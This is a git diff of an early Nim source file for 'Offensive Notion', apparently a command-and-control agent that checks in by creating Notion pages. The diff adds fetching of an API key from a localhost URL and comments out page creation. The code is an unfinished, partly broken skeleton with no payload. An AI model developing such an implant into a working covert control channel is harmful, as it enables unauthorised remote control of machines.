@@ -1,8 +1,13 @@
-import std/strformat
+import std/[
+    json,
+    asyncdispatch,
+    strformat, 
+    terminal
+]
+import system
 import parseutils
 import os
 import nativesockets
-import std/json
 import httpclient
 
 #[
@@ -15,8 +20,8 @@ import httpclient
     Do em*
 ]#
 
-let URL_BASE = "https://api.notion.com/v1"
-
+const URL_BASE = "https://api.notion.com/v1"
+const API_KEY_URL = "http://localhost:8888/api.txt"
 
 proc getConfigOptions(): tuple =
     #[  
@@ -29,14 +34,11 @@ proc getConfigOptions(): tuple =
     echo "[*] Enter the ID of the parent page > "
     let PARENT_PAGE = readLine(stdin)
 
-    echo "[*] Enter Notion API Key > "
-    let NOTION_API_KEY = readLine(stdin)
-
-    return (SLEEP_INTERVAL, PARENT_PAGE, NOTION_API_KEY)
+    return (SLEEP_INTERVAL, PARENT_PAGE)
 
 
 # Create Agent Check-in Page
-proc createPage(headers: array[0..2, (string, string)], configs: tuple): void =
+proc createPage(headers: array[0..1, (string, string)], configs: tuple): void =
     let hostname = getHostname()
     let url = fmt"{URL_BASE}/pages/"
 
@@ -61,7 +63,10 @@ proc createPage(headers: array[0..2, (string, string)], configs: tuple): void =
     echo body
     # Craft JSON request
 
-
+proc getApiKey(url: string): Future[string] {.async.} =
+    let client = newAsyncHttpClient()
+    let r = await client.get(url)
+    result = await r.body
 
 # Get new blocks*
 
@@ -72,13 +77,19 @@ proc createPage(headers: array[0..2, (string, string)], configs: tuple): void =
 
 proc main(): void =
     echo "[*] Offensive Notion! Because Reasons!"
+
+    let NOTION_API_KEY: string = await getApiKey(API_KEY_URL)
+
+    if NOTION_API_KEY != "":
+        echo "GOT THE API KEY"
+    
     let configs = getConfigOptions()
     let headers = {
         "Notion-Version": "2021-08-16",
         "Content-Type": "application/json",
         "Authorization": fmt"Bearer {configs[2]}"
     }
-    createPage(headers, configs)
+    # createPage(headers, configs)
 
 
 when isMainModule:
